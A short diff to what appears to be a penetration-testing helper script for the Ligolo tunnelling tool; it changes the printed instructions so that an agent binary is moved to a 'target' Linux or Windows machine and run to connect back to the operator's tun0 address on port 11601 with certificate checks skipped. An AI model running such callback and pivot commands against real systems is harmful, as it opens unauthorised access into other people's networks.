@@ -9,8 +9,8 @@ fi
 # Determine the local IP address for the connection
 local_ip=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
 
-echo "Printing Ligolo connect command..."
-echo "run this on the target machine: './ligolo.exe -connect ${local_ip}:11601 -ignore-cert'"
+echo "Transfer ligoloagent to target Linux machine and run: './ligolo -connect ${local_ip}:11601 -ignore-cert'"
+echo "Or transfer ligoloagent.exe to target Windows machine and run: '.\ligolo.exe -connect ${local_ip}:11601 -ignore-cert'"
 
 # Function to convert a single IP to a /24 range
 convert_ip_to_range() {
